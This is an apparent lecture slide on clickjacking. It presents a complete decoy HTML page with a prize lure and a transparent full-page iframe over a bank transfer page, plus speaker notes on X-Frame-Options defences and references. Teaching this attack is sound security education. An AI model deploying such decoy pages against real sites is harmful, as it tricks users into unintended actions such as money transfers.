---
# class: pl-15% pr-15% pt-10%
layout: center
title: Clickjacking
---
<h1>Hijacking user's clicks</h1>

<Transform scale="1">

```html
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Decoy web page</title>
</head>

<body>
  <div style="position: absolute; left: 25%; top: 5%;">
    You won! Click TOTALLY LEGIT BUTTON to get your prize!
  </div>

  <div style="position: absolute; left: 40%; top: 10%;">
    <button type="button" style="border-color: red; border-width: 2px; color: red;">
      <!-- never gets clicked since the iframe covers the entire page -->
      TOTALLY LEGIT BUTTON
    </button>
  </div>

  <!-- this iframe captures all clicks, since it covers the entire page -->
  <iframe style="opacity: 0;" width="680" height="480" scrolling="no"
    src="https://mybank/Transfer.aspx">
  </iframe>
</body>
</html>
```

<!-- A possibly legit decoy web page

The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`. Sites can use this to avoid @clickjacking (aka UI redressing)  attacks, by ensuring that their content is not embedded into other sites.

The issue here is that the target site has been loaded up within an iframe. One way to address this is via a little JavaScript in the banking website which works as follows. -->

</Transform>

<!--
Clickjacking (aka UI redressing) stands for click hijacking.

The HTML document rendered in the iframe (e.g. https://mybank/Transfer.aspx) could even be a legit website, but it's rendered in a decoy web page that tricks the user into clicking on a button/link that the user does not see.

- [Clickjacking (UI redressing)](https://portswigger.net/web-security/clickjacking)
- [Clickjack attack – the hidden threat right in front of you](https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/)

An HTTP header that start with an "X-" is not part of the HTTP spec. Such header is called custom header.
-->
